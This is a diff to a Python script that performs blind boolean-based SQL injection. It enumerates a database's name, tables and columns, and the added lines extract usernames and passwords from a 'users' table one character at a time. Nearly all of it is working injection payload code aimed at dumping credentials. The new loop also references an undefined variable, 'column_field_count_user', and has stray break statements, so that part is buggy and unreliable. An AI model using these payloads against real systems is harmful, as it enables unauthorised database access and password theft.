@@ -51,7 +51,6 @@ def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_c
         info("Found char(" + str(i) + "): " + chr(current_char))
     success(guess_type + name + '\n\n')
     return name
-
 db_name_len = guess_len("DB Name Length : ", "'+and+length(database())+=", "+%23")
 db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
 db_table_count = guess_len("DB Table Count : ", "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")
@@ -62,3 +61,14 @@ for table_no in range(db_table_count):
     for field_no in range(table_field_count):
         field_name_len = guess_len("Field Name Length: ", "'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+1+offset+" + str(field_no) + "),1))+=", "+%23")
         field_name = guess_name("Field Name: ", "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+1+offset+" + str(field_no) + "),", "+%23", field_name_len, ord(' '), ord('z'))
+column_field_count = guess_len("Column Field Count: ", "'+and+(select+count(user)+from+users)+=", "+%23")
+# column_field_count_pass = guess_len("Column Field Count Password: ", "'+and+(select+count(password)+from+users)+=", "+%23")
+for i in range(0,column_field_count_user):
+    len_each_record_user = guess_len("Length each Record User: ", "'+and+length(substr((select+user+from+users+limit+1+offset+" + str(i) + "),1))+=", "+%23")
+    for a in range(1, len_each_record_user):
+        record_name_user = guess_name("Record Name User: ", "'+and+ascii(substr((select+user+from+users+limit+1+offset+" + str(i) + "),", "+%23", len_each_record_user, ord(' '), ord('z'))
+        len_each_record_pass = guess_len("Length each Record Password: ", "'+and+length(substr((select+password+from+users+limit+1+offset+" + str(i) + "),1))+=", "+%23")
+        for c in range(1, len_each_record_pass):
+            record_name_pass = guess_name("Record Name Password: ", "'+and+ascii(substr((select+password+from+users+limit+1+offset+" + str(i) + "),", "+%23", len_each_record_pass, ord(' '), ord('z'))
+            break
+        break
